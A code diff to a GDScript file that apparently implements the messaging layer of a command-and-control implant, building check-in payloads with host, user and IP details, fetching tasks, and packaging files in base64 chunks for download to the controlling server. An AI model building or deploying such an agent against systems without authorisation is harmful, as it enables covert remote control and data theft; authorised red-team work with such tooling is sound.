@@ -72,23 +72,18 @@ func get_checkin_payload():
 	if OS.has_feature("x86_64"):
 		architecture = "x86_64"
 
-	var ip_adress :String
-
-	if OS.has_feature("Windows"):
-		if OS.has_environment("COMPUTERNAME"):
-			ip_adress =  IP.resolve_hostname(str(OS.get_environment("COMPUTERNAME")),1)
-	elif OS.has_feature("X11"):
-		print("X111")
-		if OS.has_environment("HOSTNAME"):
-			ip_adress =  IP.resolve_hostname(str(OS.get_environment("HOSTNAME")),1)
-			print("ip_adress: ", ip_adress)
-	elif OS.has_feature("OSX"):
-		if OS.has_environment("HOSTNAME"):
-			ip_adress =  IP.resolve_hostname(str(OS.get_environment("HOSTNAME")),1)
+	var ip: String = "127.0.0.1"# TODO...?
+	var upnp = UPNP.new()
+	var err = upnp.discover(2000, 2)
+	
+	if err != OK:
+		print(str(err))
+	else:
+		ip = upnp.query_external_address()
 
 	var payload = {
-		"action": "checkin", # required
-		"ip": ip_adress, # internal ip address - required
+		"action": "checkin", # requiredupnp.queryexternaladdress(), #",".join(IP.get_local_addresses()), # internal ip address - required
+		"ip": ip,
 		"os": os, # os version - required
 		"user": username, # username of current user - required
 		"host": hostname, # hostname of the computer - required
@@ -96,34 +91,33 @@ func get_checkin_payload():
 		"uuid": get_uuid(), #uuid of the payload - required
 		"architecture": architecture, # platform arch - optional
 		"domain": userdomain, # domain of the host - optional
-		#"integrity_level": 3, # integrity level of the process - optional
+		"integrity_level": 3, # integrity level of the process - optional
 		#"external_ip": "8.8.8.8", # external ip if known - optional
 		"encryption_key": "", # encryption key - optional
 		"decryption_key": "", # decryption key - optional
 	}
 
-	return JSON.new().stringify(payload)
+	return JSON.stringify(payload)
 
 func get_tasking_payload():
 	var payload = {
 		"action": "get_tasking",
-		"tasking_size": 2, # TODO: maths - calculate time between call and increase number by some amount?
-		"delegates": [],
-		"get_delegate_tasks": false,# no p2p for us at this time...
+		"tasking_size": 1,
+		#"delegates": [],
+		#"get_delegate_tasks": false,# no p2p for us at this time...
 	}
 
-	return JSON.new().stringify(payload)
+	return JSON.stringify(payload)
 
 func create_file_response(task_id, filepath, host, is_screenshot, chunk_count, chunk_size, user_output, status):
 	var payload = {
 		"task_id": task_id,
-		"full_path": filepath,
-		"host": host,
-		"is_screenshot": is_screenshot,
-		"total_chunks": chunk_count,
-		"chunk_size": chunk_size,
-		"user_output": user_output,
-		"status": status
+		"download": {
+			"total_chunks": chunk_count,
+			"full_path": filepath,
+			"host": host,
+			"is_screenshot": is_screenshot,
+		}
 	}
 
 	#return to_json(payload)
@@ -144,13 +138,14 @@ func upload_file_chunk_request(task_id, filepath, chunk_size, file_id, chunk_num
 
 func create_file_response_chunk(task_id, file_id, chunk_num, data):
 	var payload = {
-		"chunk_num": chunk_num, 
-		"file_id": file_id, 
-		"chunk_data": Marshalls.raw_to_base64(data),
-		"task_id": task_id
+		"task_id": task_id,
+		"download": {
+			"chunk_num": chunk_num,
+			"file_id": file_id,
+			"chunk_data": Marshalls.raw_to_base64(data),
+		}
 	}
 
-	#return to_json(payload)
 	return payload
 
 func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], unkeyed_payloads = []):
@@ -189,8 +184,8 @@ func create_task_response(status, completed, task_id, output, artifacts = [], cr
 
 		payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?
 
-	return JSON.new().stringify(payload)
-
+	return JSON.stringify(payload)
+	
 func unwrap_payload(packet):
 	var ret = {
 		"action": "",
@@ -201,8 +196,6 @@ func unwrap_payload(packet):
 
 	var data = Marshalls.base64_to_utf8(packet)
 	
-	print("unwrap payload was: ", data)
-
 	ret["uuid"] = data.substr(0, 36)
 
 	# TODO: decryption
@@ -216,8 +209,6 @@ func unwrap_payload(packet):
 	if ret["payload"].has("status"):
 		ret["status"] = ret["payload"].get("status") == "success"
 
-	print("unwrap return: ", ret)
-
 	return ret
 
 func wrap_payload(payload):
@@ -228,7 +219,7 @@ func wrap_payload(payload):
 
 	return payload
 
-func agent_response(payload):
+func send_agent_response(payload):
 	print("sending payload: ", payload)
 
 	payload = wrap_payload(payload)
@@ -237,7 +228,6 @@ func agent_response(payload):
 		emit_signal("agent_response", payload)
 	else:
 		print("agent response empty / false : ", payload)
-
 
 func _on_tasking_post_response(tasks):
 	# {"action":"post_response","responses":[{"task_id":"e8e7f996-45db-4ed6-a6ea-2f013c747ef4","status":"success"}]}
